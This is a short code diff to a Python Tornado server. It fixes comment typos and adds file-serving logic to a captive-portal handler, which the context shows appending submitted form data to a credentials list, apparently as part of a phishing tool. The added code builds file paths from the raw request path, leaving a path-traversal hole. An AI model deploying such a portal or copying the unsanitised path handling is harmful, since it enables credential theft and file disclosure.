@@ -49,7 +49,7 @@ class BackendHandler(tornado.web.RequestHandler):
         :type self: tornado.web.RequestHandler
         :return: None
         :rtype: None
-        ..note: overide the post method to do the verification
+        ..note: override the post method to do the verification
         """
 
         json_obj = json_decode(self.request.body)
@@ -58,7 +58,7 @@ class BackendHandler(tornado.web.RequestHandler):
         # loop all the required verification methods
         for func_name in list(json_obj.keys()):
             if func_name in backend_methods:
-                # get the correspondsing callback
+                # get the corresponding callback
                 callback = getattr(backend_methods[func_name],
                                    func_name)
                 # fire the corresponding varification method
@@ -136,6 +136,19 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
 
             creds.append(post_data)
             terminate = True
+
+        requested_file = self.request.path[1:]
+        template_directory = template.get_path()
+
+        # choose the correct file to serve
+        if os.path.isfile(template_directory + requested_file):
+            render_file = requested_file
+        else:
+            render_file = "index.html"
+
+        # load the file
+        file_path = template_directory + render_file
+        self.render(file_path, **template.get_context())
 
 
 def runHTTPServer(ip, port, ssl_port, t, em):
